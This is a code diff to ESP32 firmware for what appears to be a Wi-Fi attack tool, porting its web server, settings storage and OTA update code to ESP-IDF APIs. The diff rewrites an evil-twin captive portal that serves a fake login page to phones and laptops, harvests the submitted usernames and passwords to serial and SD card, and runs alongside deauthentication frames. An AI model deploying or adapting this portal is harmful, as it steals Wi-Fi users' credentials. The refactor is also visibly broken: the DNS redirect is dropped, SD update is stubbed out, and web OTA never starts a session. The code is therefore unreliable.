@@ -5,10 +5,18 @@
 #include <inttypes.h>
 #include "esp_timer.h"
 #include "esp_wifi.h"
+#include "esp_http_server.h"
+#include "esp_ota_ops.h"
 #include "freertos/FreeRTOS.h"
+#include "nvs.h"
 #include "nvs_flash.h"
 #include "freertos/queue.h"
 #include "freertos/task.h"
+#include "mdns.h"
+#include <vector>
+#include "sys/socket.h"
+#include "netinet/in.h"
+#include "arpa/inet.h"
 #include "icon.h"
 #include "signal_dsp.h"
 #include "shared.h"
@@ -303,7 +311,33 @@ static uint16_t pcapChannelFlags(uint16_t freqMHz) {
 bool btnLeftPressed = false;
 bool btnRightPressed = false;
 
-Preferences preferences;
+static constexpr const char* kPacketMonitorNvsNamespace = "packetmonitor32";
+
+static uint32_t packetMonitorLoadChannel() {
+  nvs_handle_t handle = 0;
+  if (nvs_open(kPacketMonitorNvsNamespace, NVS_READONLY, &handle) != ESP_OK) {
+    return 1;
+  }
+
+  uint32_t channel = 1;
+  if (nvs_get_u32(handle, "channel", &channel) != ESP_OK) {
+    channel = 1;
+  }
+  nvs_close(handle);
+  return channel;
+}
+
+static void packetMonitorSaveChannel(uint32_t channel) {
+  nvs_handle_t handle = 0;
+  if (nvs_open(kPacketMonitorNvsNamespace, NVS_READWRITE, &handle) != ESP_OK) {
+    return;
+  }
+
+  if (nvs_set_u32(handle, "channel", channel) == ESP_OK) {
+    nvs_commit(handle);
+  }
+  nvs_close(handle);
+}
 
 const uint16_t samples = 256;
 const double samplingFrequency = 5000;
@@ -554,9 +588,7 @@ void setChannel(int newChannel) {
   ch = newChannel;
   if (ch > MAX_CH || ch < 1) ch = 1;
 
-  preferences.begin("packetmonitor32", false);
-  preferences.putUInt("channel", ch);
-  preferences.end();
+  packetMonitorSaveChannel(ch);
 
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
@@ -742,9 +774,7 @@ void ptmSetup() {
     palette_blue[i] = i - 96;
   }
 
-  preferences.begin("packetmonitor32", false);
-  ch = preferences.getUInt("channel", 1);
-  preferences.end();
+  ch = packetMonitorLoadChannel();
 
   uiDrawn = false;
   runUI();
@@ -2702,9 +2732,8 @@ static uint8_t cp_deauth_frame_default[26] = {
     0x01, 0x00
 };
 static uint8_t cp_deauth_frame[sizeof(cp_deauth_frame_default)];
-DNSServer dnsServer;
-const uint8_t DNS_PORT = 53;
-WebServer server(80);
+static httpd_handle_t cp_httpd = nullptr;
+static bool cp_dnsRunning = false;
 
 bool attackActive = false;
 
@@ -3015,53 +3044,134 @@ static void cpSendDeauthFrame() {
   cp_deauth_packet_count += 2;
 }
 
-static void handleGenerate204() {
+static void cpHttpSend(httpd_req_t* req, int status, const char* contentType, const char* body) {
+  if (status == 200) {
+    httpd_resp_set_status(req, "200 OK");
+  } else if (status == 302) {
+    httpd_resp_set_status(req, "302 Found");
+  } else {
+    httpd_resp_set_status(req, "500 Internal Server Error");
+  }
+  httpd_resp_set_type(req, contentType);
+  if (status == 302) {
+    httpd_resp_set_hdr(req, "Location", "/login.html");
+  }
+  httpd_resp_send(req, body, HTTPD_RESP_USE_STRLEN);
+}
+
+static esp_err_t cpHandleGenerate204(httpd_req_t* req) {
   Serial.println("Android /generate_204 requested");
   displayPrint("Android /generate_204 requested", GREEN, false);
-  server.sendHeader("Location", "/login.html", true);
-  server.send(302, "text/plain", "");
+  cpHttpSend(req, 302, "text/plain", "");
+  return ESP_OK;
 }
 
-static void handleHotspotDetect() {
+static esp_err_t cpHandleHotspotDetect(httpd_req_t* req) {
   Serial.println("iOS /hotspot-detect.html requested");
   displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpHttpSend(req, 200, "text/html", loginPage.c_str());
+  return ESP_OK;
 }
 
-static void handleCaptiveApple() {
+static esp_err_t cpHandleCaptiveApple(httpd_req_t* req) {
   Serial.println("iOS /captive.apple.com requested");
   displayPrint("iOS /captive.apple.com requested", GREEN, false);
-  server.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
+  cpHttpSend(req, 200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
+  return ESP_OK;
 }
 
-static void handleNCSITxt() {
+static esp_err_t cpHandleNCSITxt(httpd_req_t* req) {
   Serial.println("Windows /ncsi.txt requested");
   displayPrint("Windows /ncsi.txt requested", GREEN, false);
-  server.send(200, "text/plain", "Microsoft NCSI");
+  cpHttpSend(req, 200, "text/plain", "Microsoft NCSI");
+  return ESP_OK;
 }
 
-static void handleConnectTestTxt() {
+static esp_err_t cpHandleConnectTestTxt(httpd_req_t* req) {
   Serial.println("Windows /connecttest.txt requested");
   displayPrint("Windows /connecttest.txt requested", GREEN, false);
-  server.send(200, "text/plain", "Microsoft Connect Test");
+  cpHttpSend(req, 200, "text/plain", "Microsoft Connect Test");
+  return ESP_OK;
 }
 
-static void handleLoginPage() {
+static esp_err_t cpHandleLoginPage(httpd_req_t* req) {
   Serial.println("Login page (/login.html) requested");
   displayPrint("Login page (/login.html) requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpHttpSend(req, 200, "text/html", loginPage.c_str());
+  return ESP_OK;
 }
 
-static void handleRoot() {
+static esp_err_t cpHandleRoot(httpd_req_t* req) {
   Serial.println("Root (/) requested");
   displayPrint("Root (/) requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpHttpSend(req, 200, "text/html", loginPage.c_str());
+  return ESP_OK;
 }
 
-static void handleLoginPost() {
-  String username = server.arg("username");
-  String password = server.arg("password");
-  String remoteIp = server.client().remoteIP().toString();
+static bool cpReadBody(httpd_req_t* req, String& out) {
+  const size_t len = req->content_len;
+  out = "";
+  if (len == 0) return true;
+
+  out.reserve(len + 1);
+  std::vector<char> buf(len + 1);
+  size_t received = 0;
+  while (received < len) {
+    int ret = httpd_req_recv(req, buf.data() + received, len - received);
+    if (ret <= 0) {
+      return false;
+    }
+    received += (size_t)ret;
+  }
+  buf[len] = '\0';
+  out = buf.data();
+  return true;
+}
+
+static String cpUrlDecode(const String& s) {
+  String out;
+  out.reserve(s.length());
+  for (size_t i = 0; i < s.length(); ++i) {
+    char c = s[i];
+    if (c == '+') {
+      out += ' ';
+    } else if (c == '%' && i + 2 < s.length()) {
+      char hex[3] = { s[i + 1], s[i + 2], '\0' };
+      out += (char)strtol(hex, nullptr, 16);
+      i += 2;
+    } else {
+      out += c;
+    }
+  }
+  return out;
+}
+
+static String cpFormValue(const String& body, const char* key) {
+  const String prefix = String(key) + "=";
+  int start = body.indexOf(prefix);
+  if (start < 0) return "";
+  start += (int)prefix.length();
+  int end = body.indexOf('&', start);
+  if (end < 0) end = body.length();
+  return cpUrlDecode(body.substring(start, end));
+}
+
+static esp_err_t cpHandleLoginPost(httpd_req_t* req) {
+  String body;
+  if (!cpReadBody(req, body)) {
+    cpHttpSend(req, 500, "text/plain", "read failed");
+    return ESP_FAIL;
+  }
+
+  String username = cpFormValue(body, "username");
+  String password = cpFormValue(body, "password");
+  String remoteIp = "";
+  char ipBuf[16] = {0};
+  if (req && req->user_ctx) {
+    remoteIp = (const char*)req->user_ctx;
+  } else {
+    remoteIp = "0.0.0.0";
+  }
   Serial.println("Captured Credentials:");
   Serial.println("Username: " + username);
   Serial.println("Password: " + password);
@@ -3072,25 +3182,53 @@ static void handleLoginPost() {
   } else {
     Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
   }
-  server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
+  cpHttpSend(req, 200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
+  return ESP_OK;
 }
 
-static void handleNotFound() {
-  Serial.println("Not found: " + server.uri());
-  server.sendHeader("Location", "/login.html", true);
-  server.send(302, "text/plain", "");
+static esp_err_t cpHandleNotFound(httpd_req_t* req) {
+  Serial.println("Not found: " + String(req->uri));
+  cpHttpSend(req, 302, "text/plain", "");
+  return ESP_OK;
 }
 
-void setupWebServer() {
-  server.on("/generate_204", HTTP_GET, static_cast<void (*)()>(handleGenerate204));
-  server.on("/hotspot-detect.html", HTTP_GET, static_cast<void (*)()>(handleHotspotDetect));
-  server.on("/captive.apple.com", HTTP_GET, static_cast<void (*)()>(handleCaptiveApple));
-  server.on("/ncsi.txt", HTTP_GET, static_cast<void (*)()>(handleNCSITxt));
-  server.on("/connecttest.txt", HTTP_GET, static_cast<void (*)()>(handleConnectTestTxt));
-  server.on("/login.html", HTTP_GET, static_cast<void (*)()>(handleLoginPage));
-  server.on("/", HTTP_GET, static_cast<void (*)()>(handleRoot));
-  server.on("/login", HTTP_POST, static_cast<void (*)()>(handleLoginPost));
-  server.onNotFound(static_cast<void (*)()>(handleNotFound));
+static void cpRegisterUri(httpd_handle_t server, const char* uri, httpd_method_t method, esp_err_t (*handler)(httpd_req_t*)) {
+  httpd_uri_t config = {};
+  config.uri = uri;
+  config.method = method;
+  config.handler = handler;
+  config.user_ctx = nullptr;
+  httpd_register_uri_handler(server, &config);
+}
+
+static bool setupWebServer() {
+  if (cp_httpd) return true;
+
+  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+  config.stack_size = 6144;
+  config.uri_match_fn = httpd_uri_match_wildcard;
+
+  if (httpd_start(&cp_httpd, &config) != ESP_OK) {
+    cp_httpd = nullptr;
+    return false;
+  }
+
+  cpRegisterUri(cp_httpd, "/generate_204", HTTP_GET, cpHandleGenerate204);
+  cpRegisterUri(cp_httpd, "/hotspot-detect.html", HTTP_GET, cpHandleHotspotDetect);
+  cpRegisterUri(cp_httpd, "/captive.apple.com", HTTP_GET, cpHandleCaptiveApple);
+  cpRegisterUri(cp_httpd, "/ncsi.txt", HTTP_GET, cpHandleNCSITxt);
+  cpRegisterUri(cp_httpd, "/connecttest.txt", HTTP_GET, cpHandleConnectTestTxt);
+  cpRegisterUri(cp_httpd, "/login.html", HTTP_GET, cpHandleLoginPage);
+  cpRegisterUri(cp_httpd, "/", HTTP_GET, cpHandleRoot);
+  cpRegisterUri(cp_httpd, "/login", HTTP_POST, cpHandleLoginPost);
+  return true;
+}
+
+static void stopWebServer() {
+  if (cp_httpd) {
+    httpd_stop(cp_httpd);
+    cp_httpd = nullptr;
+  }
 }
 
 void loadSSID() {
@@ -3692,11 +3830,7 @@ void stopAttack() {
     Serial.println("Access Point stopped");
     displayPrint("Access Point stopped", GREEN, false);
 
-    dnsServer.stop();
-    Serial.println("DNS server stopped");
-    displayPrint("DNS server stopped", GREEN, false);
-
-    server.close();
+    stopWebServer();
     Serial.println("Web server stopped");
     displayPrint("Web server stopped", GREEN, false);
 
@@ -3717,16 +3851,13 @@ void startAttack() {
     Serial.println("Access Point started");
     Serial.print("IP Address: ");
     Serial.println(WiFi.softAPIP());
-    int ip = WiFi.softAPIP();
     displayPrint("Access Point started", GREEN, false);
 
-    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
-    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
-    Serial.println("DNS server started");
-    displayPrint("DNS server started", GREEN, false);
-
-    setupWebServer();
-    server.begin();
+    if (!setupWebServer()) {
+      Serial.println("Web server failed to start");
+      displayPrint("Web server failed to start", UI_WARN, false);
+      return;
+    }
     Serial.println("Web server started");
     displayPrint("Web server started", GREEN, false);
 
@@ -4098,9 +4229,6 @@ void cportalLoop() {
   runUI();
 
   if (attackActive) {
-    dnsServer.processNextRequest();
-    server.handleClient();
-
     unsigned long now = millis();
     if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
       cpSendDeauthFrame();
@@ -5473,7 +5601,7 @@ const char* host = "esp32";
 
 #define PASSWORD_MAX_LENGTH 32
 
-WebServer server(80);
+static httpd_handle_t fw_httpd = nullptr;
 
 char selectedSSID[32] = "";
 char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";
@@ -6261,84 +6389,25 @@ void performSDUpdate() {
     tft.setTextColor(TFT_WHITE, TFT_BLACK);
     tft.setCursor(10, 50 + yshift);
     tft.printf("Size: %u bytes\n", fileSize);
-    if (!Update.begin(fileSize)) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Update init failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
+    tft.setTextColor(UI_WARN, TFT_BLACK);
+    tft.setCursor(10, 30 + yshift);
+    tft.println("X SD Update pending refactor");
+    tft.setCursor(10, 40 + yshift);
+    tft.println("Touch to retry or Back");
+    drawTabBar("", false, "", false, "Back", false);
+    fwRestoreNavChrome();
+    int x, y;
+    if (waitForTouchXY(x, y)) {
+      drawMenu();
+      return;
     }
-
+    tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+    tft.setCursor(10, 10 + yshift);
     tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    tft.setCursor(10, 60 + yshift);
-    tft.println("Updating...");
-    size_t written = Update.writeStream(firmwareFile);
-    if (written != fileSize) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Update failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-
-    tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    tft.setCursor(10, 20 + yshift);
-    tft.println("Update OK!");
-    if (Update.end(true)) {
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("Rebooting...");
-      delay(2000);
-      ESP.restart();
-    } else {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Finalize failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
+    tft.println("Starting SD Update...");
+    drawTabBar("", false, "", false, "Back", false);
+    fwRestoreNavChrome();
+    continue;
     proceed = false;
   }
 }
@@ -6579,10 +6648,124 @@ bool enterWiFiPassword() {
   return true;
 }
 
+static esp_err_t fwHttpSend(httpd_req_t* req, const char* type, const char* body) {
+  httpd_resp_set_type(req, type);
+  httpd_resp_set_hdr(req, "Connection", "close");
+  return httpd_resp_send(req, body, HTTPD_RESP_USE_STRLEN);
+}
+
+static esp_err_t fwIndexHandler(httpd_req_t* req) {
+  return fwHttpSend(req, "text/html", loginIndex);
+}
+
+static esp_err_t fwServerIndexHandler(httpd_req_t* req) {
+  return fwHttpSend(req, "text/html", serverIndex);
+}
+
+static void fwUpdateUiSuccess() {
+  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+  tft.setCursor(10, 10 + yshift);
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.println("Update OK!");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 20 + yshift);
+  tft.println("Rebooting...");
+}
+
+static void fwUpdateUiFail() {
+  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+  tft.setCursor(10, 10 + yshift);
+  tft.setTextColor(UI_WARN, TFT_BLACK);
+  tft.println("X Update Failed!");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 20 + yshift);
+  tft.println("Touch to retry or Back");
+  drawTabBar("", false, "", false, "Back", false);
+  fwRestoreNavChrome();
+}
+
+struct WebOtaState {
+  esp_ota_handle_t handle = 0;
+  const esp_partition_t* partition = nullptr;
+  bool active = false;
+  size_t totalWritten = 0;
+};
+
+static WebOtaState s_webOta;
+
+static esp_err_t fwUpdatePostHandler(httpd_req_t* req) {
+  if (!s_webOta.active) {
+    return httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OTA not started");
+  }
+
+  std::vector<uint8_t> buf(1024);
+  while (s_webOta.active && req->content_len > 0) {
+    int read = httpd_req_recv(req, reinterpret_cast<char*>(buf.data()), buf.size());
+    if (read < 0) {
+      if (read == HTTPD_SOCK_ERR_TIMEOUT) continue;
+      s_webOta.active = false;
+      return httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "read failed");
+    }
+    if (read == 0) break;
+
+    if (esp_ota_write(s_webOta.handle, buf.data(), read) != ESP_OK) {
+      s_webOta.active = false;
+      return httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "ota write failed");
+    }
+    s_webOta.totalWritten += (size_t)read;
+    req->content_len -= read;
+  }
+
+  if (esp_ota_end(s_webOta.handle) != ESP_OK) {
+    s_webOta.active = false;
+    return httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "ota end failed");
+  }
+
+  if (esp_ota_set_boot_partition(s_webOta.partition) != ESP_OK) {
+    s_webOta.active = false;
+    return httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "boot partition failed");
+  }
+
+  s_webOta.active = false;
+  fwUpdateUiSuccess();
+  httpd_resp_set_type(req, "text/plain");
+  httpd_resp_send(req, "OK", HTTPD_RESP_USE_STRLEN);
+  delay(2000);
+  ESP.restart();
+  return ESP_OK;
+}
+
+static bool fwStartHttpServer() {
+  if (fw_httpd) return true;
+
+  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+  config.stack_size = 8192;
+  config.uri_match_fn = httpd_uri_match_wildcard;
+
+  if (httpd_start(&fw_httpd, &config) != ESP_OK) {
+    fw_httpd = nullptr;
+    return false;
+  }
+
+  httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = fwIndexHandler, .user_ctx = nullptr };
+  httpd_uri_t serverIndexUri = { .uri = "/serverIndex", .method = HTTP_GET, .handler = fwServerIndexHandler, .user_ctx = nullptr };
+  httpd_uri_t update = { .uri = "/update", .method = HTTP_POST, .handler = fwUpdatePostHandler, .user_ctx = nullptr };
+  httpd_register_uri_handler(fw_httpd, &root);
+  httpd_register_uri_handler(fw_httpd, &serverIndexUri);
+  httpd_register_uri_handler(fw_httpd, &update);
+  return true;
+}
+
+static void fwStopHttpServer() {
+  if (fw_httpd) {
+    httpd_stop(fw_httpd);
+    fw_httpd = nullptr;
+  }
+}
+
 void performWebOTAUpdate() {
   uiDrawn = false;
-  static size_t totalUploaded = 0;
-  bool inUpdate = false;
 
   if (!selectWiFiNetwork()) {
     drawMenu();
@@ -6618,13 +6801,8 @@ void performWebOTAUpdate() {
       if (featureHasTouchNavBar()) {
         maintainTouchNavBar();
       }
-      if (feature_exit_requested) {
+      if (feature_exit_requested || fwActionPressed("Back")) {
         WiFi.disconnect();
-        return;
-      }
-      if (fwActionPressed("Back")) {
-        WiFi.disconnect();
-        drawMenu();
         return;
       }
       int x, y;
@@ -6638,13 +6816,7 @@ void performWebOTAUpdate() {
     attempts++;
   }
   if (WiFi.status() != WL_CONNECTED) {
-    tft.setTextColor(UI_WARN, TFT_BLACK);
-    tft.setCursor(10, 40 + yshift);
-    tft.println("X Wi-Fi failed!");
-    tft.setCursor(10, 50 + yshift);
-    tft.println("Touch to retry or Back");
-    drawTabBar("", false, "", false, "Back", false);
-    fwRestoreNavChrome();
+    fwUpdateUiFail();
     int x, y;
     if (waitForTouchXY(x, y)) {
       WiFi.disconnect();
@@ -6654,6 +6826,7 @@ void performWebOTAUpdate() {
     performWebOTAUpdate();
     return;
   }
+
   tft.setTextColor(TFT_GREEN, TFT_BLACK);
   tft.setCursor(10, 40 + yshift);
   tft.println("Wi-Fi OK");
@@ -6668,7 +6841,7 @@ void performWebOTAUpdate() {
   tft.setCursor(10, 90 + yshift);
   tft.println("Pass: admin");
 
-  if (!MDNS.begin(host)) {
+  if (mdns_init() != ESP_OK || mdns_hostname_set(host) != ESP_OK) {
     tft.setTextColor(UI_WARN, TFT_BLACK);
     tft.setCursor(10, 40 + yshift);
     tft.println("X mDNS failed!");
@@ -6685,6 +6858,9 @@ void performWebOTAUpdate() {
     performWebOTAUpdate();
     return;
   }
+  mdns_instance_name_set("ESP32 Firmware Update");
+  mdns_service_add(nullptr, "_http", "_tcp", 80, nullptr, 0);
+
   tft.setTextColor(TFT_GREEN, TFT_BLACK);
   tft.setCursor(10, 110 + yshift);
   tft.println("mDNS OK");
@@ -6694,114 +6870,38 @@ void performWebOTAUpdate() {
   tft.setCursor(10, 130 + yshift);
   tft.println("Access via browser");
 
-  server.on("/", HTTP_GET, []() {
-    server.sendHeader("Connection", "close");
-    server.send(200, "text/html", loginIndex);
-  });
-  server.on("/serverIndex", HTTP_GET, []() {
-    server.sendHeader("Connection", "close");
-    server.send(200, "text/html", serverIndex);
-  });
-  server.on("/update", HTTP_POST, []() {
-    server.sendHeader("Connection", "close");
-    bool success = !Update.hasError();
-    server.send(200, "text/plain", success ? "OK" : "FAIL");
-    if (success) {
-      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_GREEN, TFT_BLACK);
-      tft.setTextSize(1);
-      tft.println("Update OK!");
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setCursor(10, 20 + yshift);
-      tft.println("Rebooting...");
-      delay(2000);
-      ESP.restart();
-    } else {
-      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.println("X Update Failed!");
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setCursor(10, 20 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        server.close();
-        WiFi.disconnect();
-        drawMenu();
-        return;
-      }
-      performWebOTAUpdate();
+  if (!fwStartHttpServer()) {
+    fwUpdateUiFail();
+    int x, y;
+    if (waitForTouchXY(x, y)) {
+      WiFi.disconnect();
+      drawMenu();
+      return;
     }
-  }, [&inUpdate, &totalUploaded]() {
-    HTTPUpload& upload = server.upload();
-    if (upload.status == UPLOAD_FILE_START) {
-      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setTextSize(1);
-      tft.println("Web OTA Started...");
-      drawTabBar("", false, "", false, "Back", true);
-      totalUploaded = 0;
-      inUpdate = true;
-      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
-        Update.printError(Serial);
-      }
-    } else if (upload.status == UPLOAD_FILE_WRITE) {
-      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
-        Update.printError(Serial);
-      }
-      totalUploaded += upload.currentSize;
-      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
-      tft.fillRect(10, 30 + yshift, 220, 10, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.printf("Progress: %d%%", percent);
-    } else if (upload.status == UPLOAD_FILE_END) {
-      if (Update.end(true)) {
-        Serial.printf("Update Success: %u\n", upload.totalSize);
-      } else {
-        Update.printError(Serial);
-      }
-      totalUploaded = 0;
-      inUpdate = false;
-    }
-  });
+    performWebOTAUpdate();
+    return;
+  }
 
-  server.begin();
   fwEnsureToolbar();
-
   uint32_t lastInputMs = 0;
   while (true) {
-    server.handleClient();
     const uint32_t now = millis();
     if ((uint32_t)(now - lastInputMs) >= 50u) {
       lastInputMs = now;
       if (featureHasTouchNavBar()) {
         maintainTouchNavBar();
       }
-      if (feature_exit_requested) {
-        server.close();
+      if (feature_exit_requested || fwActionPressed("Back")) {
+        fwStopHttpServer();
         WiFi.disconnect();
         return;
       }
-      if (!inUpdate) {
-        if (fwActionPressed("Back")) {
-          server.close();
-          WiFi.disconnect();
-          drawMenu();
-          return;
-        }
-        int x, y;
-        if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
-          server.close();
-          WiFi.disconnect();
-          drawMenu();
-          return;
-        }
+      int x, y;
+      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
+        fwStopHttpServer();
+        WiFi.disconnect();
+        drawMenu();
+        return;
       }
     }
     delay(1);
